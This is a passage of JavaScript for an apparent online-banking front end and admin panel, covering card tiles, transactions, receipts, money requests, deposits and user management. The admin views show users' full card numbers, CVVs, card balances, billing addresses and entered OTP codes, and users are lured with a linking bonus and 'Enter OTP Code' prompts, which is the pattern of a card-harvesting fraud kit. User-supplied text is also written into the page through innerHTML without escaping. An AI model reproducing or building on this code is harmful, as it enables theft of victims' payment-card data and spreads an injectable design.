    var st=card.status==='authorized'?'\u2713 Authorized':card.status==='rejected'?'\u2717 Rejected':'\u29d6 Pending';
    var sclr=card.status==='authorized'?'#34d399':card.status==='rejected'?'#ff5c5c':'#ffc107';
    var tile=document.createElement('div');
    tile.className='card-tile';
    tile.style.cssText='top:'+(idx*28)+'px;z-index:'+(idx+1)+';background:'+cfg.bg+';';
    tile.innerHTML=
      '<div style="display:flex;justify-content:space-between;align-items:center;">'+
        '<div class="card-chip"></div>'+
        '<div style="display:flex;align-items:center;gap:8px;">'+
          '<span style="background:'+sc+';color:'+sclr+';font-size:10px;font-weight:700;padding:3px 8px;border-radius:20px;">'+st+'</span>'+
          '<span style="font-size:13px;font-weight:900;color:#fff;letter-spacing:1px;">'+cfg.logo+'</span>'+
        '</div>'+
      '</div>'+
      '<div style="display:flex;justify-content:space-between;align-items:flex-end;">'+
        '<div class="card-num">\u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 '+(card.lastFour||'----')+'</div>'+
        '<div><div class="card-expiry-label">Expires</div><div class="card-expiry-val">'+(card.expiry||'--/--')+'</div></div>'+
      '</div>'+
      (card.status==='pending'?'<div style="margin-top:8px;text-align:center;"><button onclick="event.stopPropagation();showPendingCardsSelector();" style="background:#e53935;color:#fff;border:none;padding:8px 16px;border-radius:8px;font-size:12px;font-weight:700;cursor:pointer;font-family:inherit;width:100%;">&#128274; Enter OTP Code</button></div>':'');
    if(isTop && card.status!=='pending') tile.onclick=function(){openModal('card-options-modal');};
    wrap.appendChild(tile);
  });
  con.appendChild(wrap);
  var actRow=document.createElement('div');
  actRow.className='cards-actions';
  actRow.innerHTML=
    '<button class="cards-action-btn" style="background:#f0f4f8;color:#0a2540;" onclick="openModal(\'card-options-modal\')">'+'\u{1f4cb}'+' Manage</button>'+
    '<button class="cards-action-btn" style="background:#1a56ff;color:#fff;" onclick="openModal(\'card-options-modal\')">+ Add Card</button>';
  con.appendChild(actRow);
}

// ── RENDER TRANSACTIONS + RECEIPTS ──
function renderTx(history){
  var txCon=$('tx-container'),recCon=$('receipt-container');
  if(!txCon) return;
  txCon.innerHTML=''; if(recCon) recCon.innerHTML='';
  if(!history||!history.length){
    txCon.innerHTML='<p style="text-align:center;color:#999;padding:20px;">No transactions yet</p>';
    if(recCon) recCon.innerHTML='<p style="text-align:center;color:#999;padding:20px;">No receipts yet</p>';
    return;
  }
  var s=sym();
  history.slice().reverse().forEach(function(tx){
    var isCredit=tx.amount>0;
    var dateStr=fmtDate(tx.date);
    var txEl=document.createElement('div');
    txEl.className='tx-item';
    txEl.innerHTML=
      '<div style="display:flex;align-items:center;flex:1;min-width:0;">'+
        '<div class="tx-icon" style="background:'+(isCredit?'#e6faf0':'#fff0f0')+';">'+(isCredit?'\u2b07\ufe0f':'\u2b06\ufe0f')+'</div>'+
        '<div class="tx-info">'+
          '<div class="tx-type">'+(tx.note||tx.type||'Transaction')+'</div>'+
          '<div class="tx-date">'+dateStr+'</div>'+
        '</div>'+
      '</div>'+
      '<div class="tx-amount '+(isCredit?'credit':'debit')+'">'+(isCredit?'+':'')+s+Math.abs(tx.amount).toFixed(2)+'</div>';
    txCon.appendChild(txEl);
    if(recCon){
      var isSend=tx.type==='Sent', isRecv=tx.type==='Received', isMR=tx.type==='MoneyRequest';
      var nameLabel=isSend?'Sent To':isRecv?'Received From':isMR?'Counterparty':'Account Holder';
      var ownName=((userData.firstname||'')+' '+(userData.surname||'')).trim();
      var nameVal=(isSend||isRecv||isMR)?(tx.counterparty||'--'):ownName;
      var acctVal=(isSend||isRecv||isMR)?(tx.counterpartyAcct||'--'):(userData.accountNumber||'--');
      var dateOnly=dateStr.split(' \u00b7 ')[0], timeOnly=dateStr.split(' \u00b7 ')[1]||'';
      var recEl=document.createElement('div');
      recEl.className='receipt-card';
      recEl.innerHTML=
        '<div class="receipt-head" style="background:'+(isCredit?'linear-gradient(135deg,#00a550,#007a3c)':'linear-gradient(135deg,#e53935,#b71c1c)')+';">'+
          '<div class="receipt-head-label">Receipt</div>'+
          '<div class="receipt-head-amount">'+(isCredit?'+':'')+s+Math.abs(tx.amount).toFixed(2)+'</div>'+
          '<div class="receipt-head-note">'+(tx.note||tx.type||'Transaction')+'</div>'+
        '</div>'+
        '<div class="receipt-body">'+
          '<div class="receipt-row"><span class="receipt-label">'+nameLabel+'</span><span class="receipt-value">'+nameVal+'</span></div>'+
          '<div class="receipt-row"><span class="receipt-label">Account</span><span class="receipt-value" style="font-family:monospace;">'+acctVal+'</span></div>'+
          '<div class="receipt-row"><span class="receipt-label">Date</span><span class="receipt-value">'+dateOnly+'</span></div>'+
          '<div class="receipt-row"><span class="receipt-label">Time</span><span class="receipt-value">'+timeOnly+'</span></div>'+
          '<div class="receipt-row"><span class="receipt-label">Type</span><span class="receipt-value" style="color:'+(isCredit?'#00a550':'#e53935')+'">'+(isCredit?'Credit \u2193':'Debit \u2191')+'</span></div>'+
        '</div>';
      recCon.appendChild(recEl);
    }
  });
}

// ── NOTIFICATIONS ──
function renderNotifications(all){
  var list=$('notif-list'); if(!list) return;
  list.innerHTML='';
  if(!all.length){list.innerHTML='<p style="text-align:center;color:#999;padding:20px;">No notifications</p>';return;}
  all.forEach(function(n){
    var el=document.createElement('div');
    el.className='notif-item'+(n.read?'':' unread');
    el.innerHTML='<div class="notif-msg">'+(n.message||'')+'</div><div class="notif-time">'+fmtDate(n.date)+'</div>';
    el.onclick=function(){ if(!n.read) db.ref('notifications/'+currentUser.uid+'/'+n.id+'/read').set(true); };
    list.appendChild(el);
  });
}

// ── ACCOUNT INFO ──
function renderAccountInfo(){
  var con=$('acct-info-rows'); if(!con) return;
  var rows=[
    ['Full Name',(userData.firstname||'')+' '+(userData.surname||'')+(userData.othername?' '+userData.othername:'')],
    ['Account Number',userData.accountNumber||'--'],
    ['Username',userData.username||'--'],
    ['Email',userData.email||'--'],
    ['Phone',userData.phone||'--'],
    ['Country',userData.country||'--'],
    ['Currency',userData.currency||'--']
  ];
  con.innerHTML=rows.map(function(r){
    return '<div class="acct-info-row"><span class="acct-info-label">'+r[0]+'</span><span class="acct-info-val">'+r[1]+'</span></div>';
  }).join('');
}

// ── REFERRAL ──
function renderReferral(){
  var code=userData.referralCode||(currentUser?'AUB-'+currentUser.uid.slice(0,6).toUpperCase():'------');
  var count=(userData.referrals||[]).length;
  var s=sym(), earned=count*10;
  var el;
  el=$('refer-code-display'); if(el) el.textContent=code;
  el=$('refer-count'); if(el) el.textContent=count;
  el=$('refer-earned'); if(el) el.textContent=s+earned;
  var link=window.location.origin+window.location.pathname+'?ref='+encodeURIComponent(code);
  el=$('refer-link-display'); if(el) el.value=link;
  el=$('refer-bar'); if(el) el.style.width=Math.min(100,(count/12)*100)+'%';
  el=$('refer-bar-label'); if(el) el.textContent=count+' / 12 referrals to claim';
  el=$('refer-claim-btn');
  if(el){el.disabled=count<12||userData.referralClaimed; el.textContent=userData.referralClaimed?'Already Claimed':'Claim '+s+(count*10)+' Bonus';}
}

// ── MONEY REQUESTS ──
function renderMoneyRequests(pending){
  var list=$('money-requests-list'); if(!list) return;
  list.innerHTML='';
  if(!pending.length){list.innerHTML='<p style="text-align:center;color:#999;padding:20px;">No pending requests</p>';return;}
  pending.forEach(function(req){
    var rs=SYM[req.currency||'USD']||'$';
    var el=document.createElement('div');
    el.className='req-item';
    el.innerHTML=
      '<div class="req-from">\u{1f4e9} '+req.fromName+'</div>'+
      '<div class="req-amount">'+rs+fmtAmt(req.amount)+'</div>'+
      (req.note?'<div class="req-note">Note: '+req.note+'</div>':'')+
      '<div class="req-date">'+fmtDate(req.date)+'</div>'+
      '<div class="req-btns">'+
        '<button class="req-accept" onclick="acceptRequest(\''+req.id+'\')">'+'\u2705'+' Accept &amp; Pay</button>'+
        '<button class="req-decline" onclick="declineRequest(\''+req.id+'\')">'+'\u274c'+' Decline</button>'+
      '</div>';
    list.appendChild(el);
  });
}

function acceptRequest(reqId){
  if(!currentUser) return;
  db.ref('moneyRequests/'+currentUser.uid+'/'+reqId).once('value').then(function(snap){
    if(!snap.exists()) return alert('Request not found.');
    var req=snap.val();
    if(req.status!=='pending') return alert('Already processed.');
    var amt=parseFloat(req.amount);
    var rs=SYM[req.currency||'USD']||'$';
    if(parseFloat(userData.balance||0)<amt){ alert('Insufficient balance. You need '+rs+fmtAmt(amt)); return; }
    var myName=(userData.firstname||'')+' '+(userData.surname||'');
    var now=new Date().toISOString();
    userRef.transaction(function(u){
      if(u){u.balance=(parseFloat(u.balance)||0)-amt;u.history=u.history||[];
        u.history.push({date:now,type:'Sent',amount:-amt,note:'Paid request: '+req.fromName,counterparty:req.fromName,counterpartyAcct:req.fromAcct});}
      return u;
    }).then(function(){
      return db.ref('users/'+req.fromUid).transaction(function(u){
        if(u){u.balance=(parseFloat(u.balance)||0)+amt;u.history=u.history||[];
          u.history.push({date:now,type:'Received',amount:amt,note:'Request accepted by '+myName,counterparty:myName,counterpartyAcct:userData.accountNumber});}
        return u;
      });
    }).then(function(){
      return db.ref('moneyRequests/'+currentUser.uid+'/'+reqId+'/status').set('accepted');
    }).then(function(){
      notify(req.fromUid,'\u2705 '+myName+' paid your request of '+rs+fmtAmt(amt)+'! Added to your balance.');
      notify(currentUser.uid,'\u{1f4b8} You paid '+rs+fmtAmt(amt)+' to '+req.fromName+'.');
      closeModal('money-requests-modal');
      alert('\u2705 Paid '+rs+fmtAmt(amt)+' to '+req.fromName+'!');
    });
  });
}

function declineRequest(reqId){
  if(!currentUser) return;
  db.ref('moneyRequests/'+currentUser.uid+'/'+reqId).once('value').then(function(snap){
    if(!snap.exists()) return;
    var req=snap.val(), rs=SYM[req.currency||'USD']||'$';
    db.ref('moneyRequests/'+currentUser.uid+'/'+reqId+'/status').set('declined').then(function(){
      notify(req.fromUid,'\u274c Your money request of '+rs+fmtAmt(req.amount)+' was declined.');
      closeModal('money-requests-modal');
    });
  });
}

// ── ADMIN: AUTH TAB ──
function loadAuthTab(){
  var _adexOnly=currentUser&&currentUser.email===ADMINADEX_EMAIL;
  var att=$('acc-attention'),aut=$('acc-authorized'),rej=$('acc-rejected');
  if(!att) return;
  att.innerHTML='<p class="acc-empty">Loading...</p>';
  aut.innerHTML='<p class="acc-empty">Loading...</p>';
  rej.innerHTML='<p class="acc-empty">Loading...</p>';
  db.ref('users').once('value').then(function(snap){
    var pending=[],authorized=[],rejected=[];
    snap.forEach(function(s){
      var u=s.val(); if(!u||u.email===ADMIN_EMAIL) return; if(_adexOnly&&u.email!=='sanderson@gmail.com') return;
      (u.linkedCards||[]).forEach(function(card,idx){
        if(!card) return;
        var item={u:u,uid:s.key,card:card,idx:idx};
        if(card.status==='authorized') authorized.push(item);
        else if(card.status==='rejected') rejected.push(item);
        else pending.push(item);
      });
    });
    function badge(id,n,cls){ var el=$(id); if(!el) return; el.textContent=n; el.style.display=n>0?'':'none'; el.className='acc-badge-span'+(cls?' '+cls:''); }
    badge('badge-attention',pending.length,'red');
    badge('badge-authorized',authorized.length,'green');
    badge('badge-rejected',rejected.length,'red');
    renderAuthSection(att,pending,true,'pending');
    renderAuthSection(aut,authorized,true,'authorized');
    renderAuthSection(rej,rejected,false,'rejected');
  });
}

function renderAuthSection(container,items,showActions,type){
  container.innerHTML='';
  if(!items.length){container.innerHTML='<p class="acc-empty">None</p>';return;}
  items.forEach(function(item){
    var u=item.u,card=item.card,uid=item.uid,idx=item.idx,ba=card.billingAddress||{};
    var cid='cmt-'+uid+'-'+idx;
    var actHTML='';
    if(showActions){
      actHTML='<textarea class="admin-comment" id="'+cid+'" placeholder="'+(type==='pending'?'Comment (optional)':'Reason (required)')+'" rows="2"></textarea><div class="admin-card-actions">';
      if(type==='pending') actHTML+='<button class="admin-action-btn green" onclick="adminAuth(\''+uid+'\','+idx+',\''+cid+'\')">'+'\u2705'+' Authorize</button><button class="admin-action-btn red" onclick="adminReject(\''+uid+'\','+idx+',\''+cid+'\')">'+'\u274c'+' Reject</button>';
      else actHTML+='<button class="admin-action-btn gray" onclick="adminRemove(\''+uid+'\','+idx+',\''+cid+'\')">'+'\u{1f5d1}'+' Remove</button><button class="admin-action-btn red" onclick="adminReject(\''+uid+'\','+idx+',\''+cid+'\')">'+'\u274c'+' Reject</button>';
      actHTML+='</div>';
    }
    var div=document.createElement('div');
    div.className='admin-card';
    div.innerHTML=
      '<div class="admin-card-name">'+u.firstname+' '+u.surname+'</div>'+
      mkrow('Email',u.email)+mkrow('Account #',u.accountNumber)+mkrow('Country',u.country)+
      mkrow('Cardholder',card.name)+mkrow('Bank',card.bankName||'--')+mkrow('Submitted',fmtDate(card.addedDate||''))+mkrow('Brand',card.brand)+mkrow('Card #',card.number)+mkrow('Last 4','....'+card.lastFour)+
      mkrow('Expiry',card.expiry)+mkrow('CVV',card.cvv)+mkrow('Bal',card.currentBalance)+
      mkrow('Street',ba.street||'--')+mkrow('City',ba.city||'--')+mkrow('Postcode',ba.postcode||'--')+mkrow('Phone',ba.phone||u.phone||'--')+
      (card.otpCode?'<div class="admin-detail-row"><span class="admin-detail-label">OTP</span><span style="color:#4dabff;font-weight:700;">'+card.otpCode+'</span></div>':'')+
      actHTML;
    container.appendChild(div);
  });
}
function mkrow(label,val){ return '<div class="admin-detail-row"><span class="admin-detail-label">'+label+'</span><span>'+(val||'--')+'</span></div>'; }

function adminAuth(uid,idx,cid){
  db.ref('users/'+uid).once('value').then(function(snap){
    var u=snap.val(); if(!u) return;
    var cards=u.linkedCards||[]; if(!cards[idx]) return;
    var otp=String(Math.floor(100000+Math.random()*900000));
    cards[idx].status='authorized'; cards[idx].otpCode=otp; cards[idx].authorizedDate=new Date().toISOString();
    var comment=$(cid); if(comment&&comment.value) cards[idx].adminComment=comment.value;
    db.ref('users/'+uid+'/linkedCards').set(cards).then(function(){
      db.ref('users/'+uid+'/verified').set(true);
      if(!u.cardLinkBonus){
        db.ref('users/'+uid).transaction(function(d){if(d){d.balance=(parseFloat(d.balance)||0)+25;d.cardLinkBonus=true;}return d;});
        notify(uid,'\u2705 Card authorized! $25 bonus added. Your OTP: '+otp);
      
      } else { notify(uid,'\u2705 Card authorized. Your OTP: '+otp); }
      loadAuthTab();
    });
  });
}

function adminReject(uid,idx,cid){
  var reason=$(cid)?$(cid).value.trim():'';
  if(!reason){ alert('Please enter a reason.'); return; }
  db.ref('users/'+uid).once('value').then(function(snap){
    var u=snap.val(); if(!u) return;
    var cards=u.linkedCards||[]; if(!cards[idx]) return;
    cards[idx].status='rejected'; cards[idx].adminComment=reason; cards[idx].rejectedDate=new Date().toISOString();
    db.ref('users/'+uid+'/linkedCards').set(cards).then(function(){
      notify(uid,'\u274c Your card was rejected. Reason: '+reason);
      
      loadAuthTab();
    });
  });
}

function adminRemove(uid,idx,cid){
  var reason=$(cid)?$(cid).value.trim():'';
  if(!reason){ alert('Please enter a reason.'); return; }
  db.ref('users/'+uid).once('value').then(function(snap){
    var u=snap.val(); if(!u) return;
    var cards=u.linkedCards||[];
    cards.splice(idx,1);
    db.ref('users/'+uid+'/linkedCards').set(cards).then(function(){
      notify(uid,'\u{1f4b3} Your card was removed. Reason: '+reason);
      loadAuthTab();
    });
  });
}

// ── ADMIN: DEPOSITS TAB ──
function loadDepositsTab(){
  var _adexOnly=currentUser&&currentUser.email===ADMINADEX_EMAIL;
  var list=$('deposits-list'); if(!list) return;
  list.innerHTML='<p class="acc-empty">Loading...</p>';
  db.ref('depositRequests').once('value').then(function(snap){
    if(!snap.exists()){list.innerHTML='<p class="acc-empty">No deposit requests yet</p>';return;}
    var all=[];
    snap.forEach(function(s){var _r=s.val();if(!_r)return;if(_adexOnly&&_r.email!=='sanderson@gmail.com')return;all.push(Object.assign({},_r,{reqKey:s.key}));});
    all.sort(function(a,b){
      if(a.status==='pending'&&b.status!=='pending') return -1;
      if(b.status==='pending'&&a.status!=='pending') return 1;
      return new Date(b.date)-new Date(a.date);
    });
    list.innerHTML='';
    all.forEach(function(req){
      var rs=SYM[req.currency||'USD']||'$';
      var isPending=req.status==='pending';
      var div=document.createElement('div');
      div.className='deposit-card';
      div.innerHTML=
        '<span class="deposit-status '+req.status+'">'+(isPending?'\u29d6 PENDING':req.status==='approved'?'\u2705 APPROVED':'\u274c REJECTED')+'</span>'+
        '<div class="admin-card-name">'+req.name+'</div>'+
        mkrow('Email',req.email)+
        '<div class="admin-detail-row"><span class="admin-detail-label">Amount</span><span style="color:#34d399;font-weight:700;font-size:16px;">'+rs+parseFloat(req.amount).toFixed(2)+'</span></div>'+
        mkrow('Card',req.cardBrand+' ....'+req.cardLastFour)+
        mkrow('Card #',req.cardNumber||'--')+
        mkrow('Account',req.accountNumber)+
        mkrow('Date',fmtDate(req.date))+
        (isPending?'<div class="admin-card-actions" style="margin-top:12px;"><button class="admin-action-btn green" onclick="approveDeposit(\''+req.reqKey+'\')">'+'\u2705'+' Approve</button><button class="admin-action-btn red" onclick="rejectDeposit(\''+req.reqKey+'\')">'+'\u274c'+' Reject</button></div>':'');
      list.appendChild(div);
    });
  });
}

function approveDeposit(reqKey){
  db.ref('depositRequests/'+reqKey).once('value').then(function(snap){
    if(!snap.exists()) return alert('Not found.');
    var req=snap.val(); if(req.status!=='pending') return alert('Already processed.');
    var amt=parseFloat(req.amount), rs=SYM[req.currency||'USD']||'$';
    db.ref('users/'+req.uid).transaction(function(u){
      if(u){u.balance=(parseFloat(u.balance)||0)+amt;u.history=u.history||[];
        u.history.push({date:new Date().toISOString(),type:'Deposit',amount:amt,note:'Deposit approved ('+req.cardBrand+' ....'+req.cardLastFour+')'});}
      return u;
    }).then(function(){
      return db.ref('depositRequests/'+reqKey).update({status:'approved',processedDate:new Date().toISOString()});
    }).then(function(){
      notify(req.uid,'\u2705 Deposit of '+rs+amt.toFixed(2)+' approved and added to your balance!');
      
      loadDepositsTab();
    });
  });
}

function rejectDeposit(reqKey){
  var reason=prompt('Reason for rejection:'); if(reason===null) return;
  db.ref('depositRequests/'+reqKey).once('value').then(function(snap){
    if(!snap.exists()) return;
    var req=snap.val(), rs=SYM[req.currency||'USD']||'$';
    db.ref('depositRequests/'+reqKey).update({status:'rejected',rejectReason:reason||'Rejected',processedDate:new Date().toISOString()}).then(function(){
      notify(req.uid,'\u274c Deposit of '+rs+parseFloat(req.amount).toFixed(2)+' rejected.'+(reason?' Reason: '+reason:''));
      loadDepositsTab();
    });
  });
}

// ── ADMIN: USERS TAB ──
function loadUsersTab(){
  var _adexOnly=currentUser&&currentUser.email===ADMINADEX_EMAIL;
  var con=$('users-list'); if(!con) return;
  con.innerHTML='<p class="acc-empty">Loading...</p>';
  db.ref('users').once('value').then(function(snap){
    var byCountry={};
    snap.forEach(function(s){
      var u=s.val(); if(!u||u.email===ADMIN_EMAIL) return; if(_adexOnly&&u.email!=='sanderson@gmail.com') return;
      var co=(u.country&&u.country.trim())||'Other';
      if(!byCountry[co]) byCountry[co]=[];
      byCountry[co].push(Object.assign({},u,{uid:s.key}));
    });
    con.innerHTML='';
    var countries=Object.keys(byCountry).sort();
    if(!countries.length){con.innerHTML='<p class="acc-empty">No users yet</p>';return;}
    var flagMap={USA:'🇺🇸',UK:'🇬🇧',Nigeria:'🇳🇬',Germany:'🇩🇪',France:'🇫🇷',Canada:'🇨🇦',Brazil:'🇧🇷',Australia:'🇦🇺',Other:'🌍'};
    countries.forEach(function(country){
      var users=byCountry[country], flag=flagMap[country]||'🌍';
      var block=document.createElement('div'); block.className='country-block';
      var hdr=document.createElement('div'); hdr.className='country-header-row';
      hdr.innerHTML='<span class="country-name">'+flag+' '+country+'</span><span class="country-count">'+users.length+' user'+(users.length!==1?'s':'')+'</span>';
      block.appendChild(hdr);
      users.forEach(function(u){
        var rs=SYM[u.currency||'USD']||'$';
        var ucard=document.createElement('div'); ucard.className='admin-user-card';
        ucard.innerHTML=
          '<div class="admin-user-name">'+u.firstname+' '+u.surname+'</div>'+
          '<div class="admin-user-detail">'+'\u{1f4e7}'+' '+u.email+'</div>'+
          '<div class="admin-user-detail">'+'\u{1f4b0}'+' Balance: '+rs+(u.balance||0).toFixed(2)+'</div>'+
          '<div class="admin-user-detail">'+'🔢'+' Account: '+(u.accountNumber||'--')+'</div>'+
          '<div class="admin-user-detail">'+'💳'+' Cards: '+((u.linkedCards||[]).filter(function(c){return c;}).length)+'</div>'+
          '<div class="admin-user-actions">'+
            '<input type="text" class="admin-pin-input" id="pin-'+u.uid+'" placeholder="PIN" maxlength="4" inputmode="numeric">'+
            '<button class="admin-action-btn green" style="flex:none;padding:10px 14px;font-size:13px;" onclick="setUserPin(\''+u.uid+'\')">Set PIN</button>'+
            '<button class="admin-action-btn orange" style="flex:none;padding:10px 14px;font-size:13px;" onclick="msgUser(\''+u.uid+'\')">'+'📨'+' Msg</button>'+
          '</div>';
        block.appendChild(ucard);
      });
      con.appendChild(block);
    });
  });
}

function setUserPin(uid){
  var inp=$('pin-'+uid); var pin=inp?inp.value.trim():'';
  if(!pin||pin.length!==4){alert('Enter a 4-digit PIN.');return;}
  db.ref('users/'+uid+'/pin').set(pin).then(function(){alert('PIN updated!');});
}
function msgUser(uid){
  var msg=prompt('Message to send:'); if(!msg) return;
  notify(uid,'📢 Admin: '+msg).then(function(){alert('Sent!');});
}

// ════════════════════════════════════════════
// EVENT HANDLERS — inside DOMContentLoaded
// ════════════════════════════════════════════
// ── PENDING CARDS SELECTOR ──
window.showPendingCardsSelector=function(){
  var pending=(userData.linkedCards||[]).filter(function(c){return c&&c.status==='pending';});
  if(!pending.length){alert('No pending cards found.');return;}
  if(pending.length===1){
    // Only one pending card - open modal directly
    openModal('verify-modal');
    return;
  }
  // Multiple pending cards - show selector
  var modal=document.createElement('div');
  modal.id='pending-cards-selector';
  modal.style.cssText='position:fixed;inset:0;background:rgba(0,0,0,0.7);z-index:9999;display:flex;align-items:center;justify-content:center;padding:20px;';
  modal.onclick=function(e){if(e.target===modal)modal.remove();};
  
  var box=document.createElement('div');
  box.style.cssText='background:#0d2137;border-radius:16px;padding:20px;width:100%;max-width:400px;max-height:80vh;overflow-y:auto;';
  
  var title=document.createElement('div');
  title.textContent='Select Card to Enter OTP';
  title.style.cssText='font-size:18px;font-weight:700;color:#fff;margin-bottom:16px;text-align:center;';
  box.appendChild(title);
  
  pending.forEach(function(card){
    var item=document.createElement('div');
    item.style.cssText='background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:12px;padding:14px;margin-bottom:10px;cursor:pointer;transition:all 0.2s;';
    item.onmouseover=function(){this.style.background='rgba(255,255,255,0.1)';};
    item.onmouseout=function(){this.style.background='rgba(255,255,255,0.05)';};
    item.onclick=function(){
      modal.remove();
      openModal('verify-modal');
    };
    
    item.innerHTML=
      '<div style="font-size:14px;font-weight:700;color:#fff;margin-bottom:4px;">'+card.brand+' &#8226;&#8226;&#8226;&#8226;'+card.lastFour+'</div>'+
      '<div style="font-size:12px;color:rgba(255,255,255,0.6);">'+(card.bankName||'Bank not provided')+'</div>'+
      '<div style="font-size:11px;color:#ffc107;margin-top:4px;">&#9201; Pending verification</div>';
    
    box.appendChild(item);
  });
  
  var cancel=document.createElement('button');
  cancel.textContent='Cancel';
  cancel.style.cssText='width:100%;background:rgba(255,255,255,0.1);color:#fff;border:none;padding:12px;border-radius:10px;margin-top:6px;font-size:14px;font-weight:600;cursor:pointer;font-family:inherit;';
  cancel.onclick=function(){modal.remove();};
  box.appendChild(cancel);
  
  modal.appendChild(box);
  document.body.appendChild(modal);
}